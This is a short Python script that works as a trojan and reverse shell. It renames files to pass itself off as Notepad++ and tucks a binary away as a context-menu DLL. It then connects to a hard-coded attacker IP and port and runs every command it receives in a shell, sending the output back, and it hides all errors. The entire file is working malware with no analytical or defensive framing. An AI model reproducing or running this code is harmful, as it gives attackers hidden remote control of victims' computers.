import socket
import subprocess
import os

os.system(f"move notepad++.exe ContextMenu\\NppShell2.dll")
os.system(f"move real_notepad++.exe notepad++.exe")

HOST = "10.23.24.7"  # Change to your attacker's IP
PORT = 9001         # Change to your desired port

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))

    while True:
        # Receive command
        command = s.recv(1024).decode("utf-8")
        if command.lower() == "exit":
            break  # Exit if "exit" command is received

        # Execute command
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output, error = process.communicate()
        
        # Send back command output or error
        response = output + error
        s.send(response if response else b"[+] Command executed with no output\n")

    s.close()
except:
    pass
